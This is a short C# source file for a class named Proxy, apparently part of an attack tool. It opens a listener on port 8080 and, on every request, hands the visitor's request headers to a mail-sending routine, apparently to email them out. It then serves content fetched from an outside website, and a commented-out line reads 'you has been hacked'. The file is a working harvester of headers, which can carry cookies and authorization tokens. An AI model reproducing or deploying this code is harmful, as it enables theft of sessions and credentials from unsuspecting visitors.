
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.IO;
using System.Net.Http;
using Flurl.Http;
using Flurl;
using System.Windows.Forms;

namespace zoomed
{
    class Proxy
    {
        public Proxy()
        {

        }

        HttpListener listener = new HttpListener();

        public void startProxy()
        {
            
            listener.Prefixes.Add("http://*:8080/");
            listener.Start();
            //MessageBox.Show("listening");
            listener.BeginGetContext(OnContext, null);

            

            // Note: The GetContext method blocks while waiting for a request.
            //HttpListenerContext context = listener.GetContext();
            //HttpListenerRequest request = context.Request;
            //sendRequest(request.Headers);

        }

        private async void OnContext(IAsyncResult ar)
        {
            var context = listener.EndGetContext(ar);
            sendRequestInMail(context.Request.Headers);

            var cli = new FlurlClient("http://sanignaciovina.cl");

            string text = await "http://sanignaciovina.cl".GetStringAsync();


            listener.BeginGetContext(OnContext, null);

           


            //string responseString = "you has been hacked";
            byte[] buffer = Encoding.UTF8.GetBytes(text);
            context.Response.ContentLength64 = buffer.Length;
            Stream output = context.Response.OutputStream;
            output.Write(buffer, 0, buffer.Length);
        }

        private void sendRequestInMail(object request)
        {
            string toString = request.ToString();
            
            

            sendMail send = new sendMail();
            send.send(toString);
        }


       




    }
}
